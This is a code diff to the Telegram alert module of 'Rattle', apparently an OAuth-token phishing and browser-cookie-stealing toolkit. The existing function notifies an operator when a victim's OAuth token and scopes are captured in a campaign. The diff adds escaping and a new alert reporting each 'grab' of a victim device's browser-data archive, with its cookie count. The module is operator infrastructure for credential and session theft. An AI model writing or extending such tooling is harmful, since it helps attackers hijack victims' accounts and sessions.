@@ -1,10 +1,11 @@
 """
 Telegram notifications for Rattle.
-Sends a message through the Telegram Bot API whenever a token is captured.
-Pure standard library + requests, no frameworks, safe to import anywhere.
+Sends messages through the Telegram Bot API.
+Pure standard library + requests, safe to import anywhere.
 """
 
 import logging
+from html import escape
 
 import requests
 
@@ -39,8 +40,22 @@ def notify_new_token(bot_token, chat_id, campaign_name, victim_label, scopes):
     """Fire a Telegram alert when a new OAuth token is captured."""
     msg = (
         "&#127919; <b>Rattle capture</b>\n"
-        f"Campaign: <b>{campaign_name}</b>\n"
-        f"Target: {victim_label}\n"
-        f"Scopes: {scopes}"
+        f"Campaign: <b>{escape(str(campaign_name))}</b>\n"
+        f"Target: {escape(str(victim_label))}\n"
+        f"Scopes: {escape(str(scopes))}"
+    )
+    return send_telegram(bot_token, chat_id, msg)
+
+
+def notify_new_grab(
+    bot_token, chat_id, device_label, browsers, cookie_count, size_mb
+):
+    """Fire a Telegram alert when the server receives a browser-data archive."""
+    msg = (
+        "&#128230; <b>Rattle grab received</b>\n"
+        f"Device: <b>{escape(str(device_label))}</b>\n"
+        f"Browsers: {escape(str(browsers or 'unknown'))}\n"
+        f"Cookies: {cookie_count}\n"
+        f"Size: {size_mb} MB"
     )
     return send_telegram(bot_token, chat_id, msg)
